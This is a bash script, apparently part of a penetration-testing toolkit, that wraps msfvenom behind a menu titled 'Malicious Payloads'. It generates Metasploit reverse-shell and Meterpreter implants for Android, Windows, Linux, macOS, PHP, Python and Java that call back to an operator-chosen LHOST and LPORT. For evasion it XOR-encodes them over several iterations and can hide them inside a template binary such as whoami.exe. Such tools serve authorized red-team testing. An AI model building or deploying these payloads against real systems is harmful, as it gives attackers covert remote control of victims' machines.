#!/usr/bin/env bash

# by Lee Baird (@discoverscripts)

f_msfvenom_run(){
    local output rc=0

    output=$(mktemp)
    echo "[*] Generating payload..."
    msfvenom "$@" > "$output" 2>&1 || rc=$?
    grep -E '^(Found |Attempting |Payload size:|[[:alnum:]_.+-]+ (succeeded|chosen))' "$output" || true
    if [ "$rc" -ne 0 ]; then
        echo
        echo -e "${RED}[!] msfvenom failed.${NC}"
        sed -e 's/\r$//' "$output" \
            | grep -v -E '^(Running the|Existing database|Starting database|waiting for server|pg_ctl:|Examine the log|stopped waiting|failed)$' \
            | sed '/^$/d' | head -10
        echo
    fi
    rm -f "$output"
    return $rc
}

clear
f_banner

f_format(){
    echo
    echo -e "${BLUE}Formats${NC}"
    echo
    echo "1. aspx"
    echo "2. c"
    echo "3. csharp"
    echo "4. exe"
    echo "5. psh"
    echo "6. raw"
    echo "7. vba"
    echo
    echo -n "Choice: "
    read -r CHOICE2
    CHOICE2="${CHOICE2#"${CHOICE2%%[![:space:]]*}"}"
    CHOICE2="${CHOICE2%"${CHOICE2##*[![:space:]]}"}"

    case "$CHOICE2" in
        1) EXTENTION=".aspx"
            FORMAT="aspx" ;;
        2) EXTENTION=".c"
            FORMAT="c" ;;
        3) EXTENTION=".cs"
            FORMAT="csharp" ;;
        4) EXTENTION=".exe"
            FORMAT="exe" ;;
        5) EXTENTION=".ps1"
            FORMAT="psh" ;;
        6) EXTENTION=".bin"
            FORMAT="raw" ;;
        7) EXTENTION=".vba"
            FORMAT="vba" ;;
        *) f_invalid; exit 1 ;;
    esac
}

echo -e "${BLUE}Malicious Payloads${NC}"
echo
echo "1.   android/meterpreter/reverse_tcp         (.apk)"
echo "2.   cmd/windows/reverse_powershell          (.bat)"
echo "3.   java/jsp_shell_reverse_tcp (Linux)      (.jsp)"
echo "4.   java/jsp_shell_reverse_tcp (Windows)    (.jsp)"
echo "5.   java/shell_reverse_tcp                  (.war)"
echo "6.   linux/x64/meterpreter_reverse_https     (.elf)"
echo "7.   linux/x64/meterpreter_reverse_tcp       (.elf)"
echo "8.   linux/x64/shell/reverse_tcp             (.elf)"
echo "9.   osx/x64/meterpreter_reverse_https       (.macho)"
echo "10.  osx/x64/meterpreter_reverse_tcp         (.macho)"
echo "11.  php/meterpreter_reverse_tcp             (.php)"
echo "12.  python/meterpreter_reverse_https        (.py)"
echo "13.  python/meterpreter_reverse_tcp          (.py)"
echo "14.  windows/x64/meterpreter_reverse_https   (multi)"
echo "15.  windows/x64/meterpreter_reverse_tcp     (multi)"
echo "16.  Previous menu"

echo
echo -n "Choice: "
read -r CHOICE
CHOICE="${CHOICE#"${CHOICE%%[![:space:]]*}"}"
CHOICE="${CHOICE%"${CHOICE##*[![:space:]]}"}"

case "$CHOICE" in
    1) PAYLOAD="android/meterpreter/reverse_tcp"
        EXTENTION=".apk"
        FORMAT="raw"
        ARCH="dalvik"
        PLATFORM="android" ;;
    2) PAYLOAD="cmd/windows/reverse_powershell"
        EXTENTION=".bat"
        FORMAT="raw"
        ARCH="cmd"
        PLATFORM="windows" ;;
    3) PAYLOAD="java/jsp_shell_reverse_tcp"
        EXTENTION=".jsp"
        FORMAT="raw"
        ARCH="elf"
        PLATFORM="linux" ;;
    4) PAYLOAD="java/jsp_shell_reverse_tcp"
        EXTENTION=".jsp"
        FORMAT="raw"
        ARCH="cmd"
        PLATFORM="windows" ;;
    5) PAYLOAD="java/shell_reverse_tcp"
        EXTENTION=".war"
        FORMAT="war"
        ARCH="x64"
        PLATFORM="linux" ;;
    6) PAYLOAD="linux/x64/meterpreter_reverse_https"
        EXTENTION=".elf"
        FORMAT="elf"
        ARCH="x64"
        PLATFORM="linux" ;;
    7) PAYLOAD="linux/x64/meterpreter_reverse_tcp"
        EXTENTION=".elf"
        FORMAT="elf"
        ARCH="x64"
        PLATFORM="linux" ;;
    8) PAYLOAD="linux/x64/shell/reverse_tcp"
        EXTENTION=".elf"
        FORMAT="elf"
        ARCH="x64"
        PLATFORM="linux" ;;
    9) PAYLOAD="osx/x64/meterpreter_reverse_https"
        EXTENTION=".macho"
        FORMAT="macho"
        ARCH="x64"
        PLATFORM="osx" ;;
    10) PAYLOAD="osx/x64/meterpreter_reverse_tcp"
        EXTENTION=".macho"
        FORMAT="macho"
        ARCH="x64"
        PLATFORM="osx" ;;
    11) PAYLOAD="php/meterpreter_reverse_tcp"
        EXTENTION=".php"
        FORMAT="raw"
        ARCH="php"
        PLATFORM="php" ;;
    12) PAYLOAD="python/meterpreter_reverse_https"
        EXTENTION=".py"
        FORMAT="raw"
        ARCH="python"
        PLATFORM="python" ;;
    13) PAYLOAD="python/meterpreter_reverse_tcp"
        EXTENTION=".py"
        FORMAT="raw"
        ARCH="python"
        PLATFORM="python" ;;
    14) PAYLOAD="windows/x64/meterpreter_reverse_https"
        ARCH="x64"
        PLATFORM="windows"
        f_format ;;
    15) PAYLOAD="windows/x64/meterpreter_reverse_tcp"
        ARCH="x64"
        PLATFORM="windows"
        f_format ;;
    16) exit 1 ;;
    *) f_invalid; exit 1 ;;
esac

echo
echo -n "LHOST: "
read -r LHOST

# Check for no answer
if [ -z "$LHOST" ]; then
    LHOST=$MYIP
    echo "[*] Using $MYIP"
    echo
fi

echo -n "LPORT: "
read -r LPORT

# Check for no answer.
if [ -z "$LPORT" ]; then
    LPORT=443
    echo "[*] Using 443"
    echo
fi

# Check for valid port number.
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [[ "$LPORT" -lt 1 || "$LPORT" -gt 65535 ]]; then
    f_invalid; exit 1
fi

echo -n "Iterations: "
read -r ITERATIONS

# Check for no answer.
if [ -z "$ITERATIONS" ]; then
    ITERATIONS=1
    echo "[*] Using 1"
fi

# Check for valid number that is reasonable.
if ! [[ "$ITERATIONS" =~ ^[0-9]+$ ]] || [[ "$ITERATIONS" -lt 0 || "$ITERATIONS" -gt 20 ]]; then
    f_invalid; exit 1
fi

X=$(echo "$PAYLOAD" | sed 's/\//-/g')

echo
echo -n "Use a template file? (y/N) "
read -r ANSWER

if [ "$ANSWER" == "y" ]; then
    echo -n "Enter the path to the file (default whoami.exe): "
    read -r TEMPLATE

    if [ -z "$TEMPLATE" ]; then
        TEMPLATE=/usr/share/windows-resources/binaries/whoami.exe
        echo "[*] Using /usr/share/windows-resources/binaries/whoami.exe"
    fi

    TEMPLATE="${TEMPLATE/#\~/$HOME}"

    if [ ! -f "$TEMPLATE" ]; then
        f_invalid; exit 1
    fi

    OUTPUT_FILE="$HOME/data/$X-$LPORT-$ITERATIONS$EXTENTION"
    echo
    if ! f_msfvenom_run -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -x "$TEMPLATE" -e x64/xor_dynamic -i "$ITERATIONS" -o "$OUTPUT_FILE"; then
        f_invalid; exit 1
    fi
else
    OUTPUT_FILE="$HOME/data/$X-$LPORT-$ITERATIONS$EXTENTION"
    echo
    if ! f_msfvenom_run -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -e x64/xor_dynamic -i "$ITERATIONS" -o "$OUTPUT_FILE"; then
        f_invalid; exit 1
    fi
fi

if [ ! -s "$OUTPUT_FILE" ]; then
    echo
    echo -e "${RED}[!] Payload file was not created.${NC}"
    echo
    sleep 2
    exit 1
fi

echo
echo "$MEDIUM"
echo
echo -e "New payload located at ${YELLOW}$OUTPUT_FILE${NC}"
echo
exit 0
